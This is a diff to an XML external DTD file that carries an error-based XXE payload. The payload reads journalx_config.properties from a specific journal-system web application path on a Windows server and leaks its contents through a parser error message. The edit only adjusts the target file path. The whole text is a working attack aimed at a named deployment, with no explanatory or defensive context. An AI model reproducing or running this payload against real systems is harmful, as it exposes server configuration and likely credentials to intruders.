@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///d:/magtech/journalx_dzkjqb/WEB-INF/classes/journalx_config.properties">
+<!ENTITY % file SYSTEM "file:///d:/magtech/journalx_dzkjqb/WEB-INF/journalx_config.properties">
 <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///GG%file;'>">
 %eval;
 %err;
